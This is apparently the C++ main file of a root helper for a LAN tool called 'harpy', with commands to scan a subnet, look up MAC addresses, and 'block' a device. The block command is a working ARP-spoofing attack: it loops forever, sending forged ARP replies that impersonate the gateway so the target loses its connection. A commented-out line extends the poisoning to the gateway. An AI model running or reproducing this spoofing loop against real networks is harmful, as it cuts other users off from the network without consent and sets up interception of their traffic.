#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include "network_scan.h"
#include "arp_operations.h"

void print_usage(const char* prog) {
    std::cerr << "Usage: " << prog << " <command> [args...]" << std::endl;
    std::cerr << "Commands:" << std::endl;
    std::cerr << "  scan <interface> <subnet_prefix>    Scan network" << std::endl;
    std::cerr << "  mac <interface> <ip>               Get MAC for IP" << std::endl;
    std::cerr << "  block <interface> <target_ip> <gateway_ip> <our_mac>" << std::endl;
}

int main(int argc, char* argv[]) {
    std::cout << "DEBUG: harpy_root_helper starting..." << std::endl;
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    std::string command = argv[1];

    if (command == "scan") {
        if (argc < 4) {
            std::cerr << "Error: scan requires interface and subnet_prefix" << std::endl;
            return 1;
        }
        
        const char* iface = argv[2];
        const char* subnet = argv[3];
        int timeout = 5;

        network_scan_init();
        std::vector<std::string> devices = network_scan(iface, subnet, timeout);
        
        std::cout << "DEBUG: Scan finished. Discovered " << devices.size() << " devices." << std::endl;
        for (const auto& dev : devices) {
            std::cout << dev << std::endl;
        }
    } 
    else if (command == "mac") {
        if (argc < 4) {
            std::cerr << "Error: mac requires interface and ip" << std::endl;
            return 1;
        }

        const char* iface = argv[2];
        const char* ip = argv[3];

        arp_init();
        std::string mac = arp_get_mac(ip, iface);
        if (!mac.empty()) {
            std::cout << mac << std::endl;
        } else {
            return 1;
        }
    }
    else if (command == "block") {
        if (argc < 6) {
            print_usage(argv[0]);
            return 1;
        }
        const char* iface = argv[2];
        const char* target_ip = argv[3];
        const char* gateway_ip = argv[4];
        const char* our_mac = argv[5];

        std::cout << "DEBUG: Blocking " << target_ip << " using gateway " << gateway_ip << std::endl;
        
        // 1. Resolve target MAC
        arp_init();
        std::string target_mac = arp_get_mac(target_ip, iface);
        if (target_mac.empty()) {
            std::cerr << "ERROR: Could not resolve MAC for " << target_ip << std::endl;
            return 1;
        }
        std::cout << "DEBUG: Resolved target " << target_ip << " to " << target_mac << std::endl;

        // 2. Continuous spoofing loop
        std::cout << "BLOCK_STARTED: " << target_ip << std::endl;
        while (true) {
            // Tell target we are the gateway
            arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false);
            // Tell gateway we are the target (to blackhole the route)
            // arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false);
            
            usleep(2000000); // 2 seconds
        }
    }
    else {
        std::cerr << "Unknown command: " << command << std::endl;
        print_usage(argv[0]);
        return 1;
    }

    return 0;
}
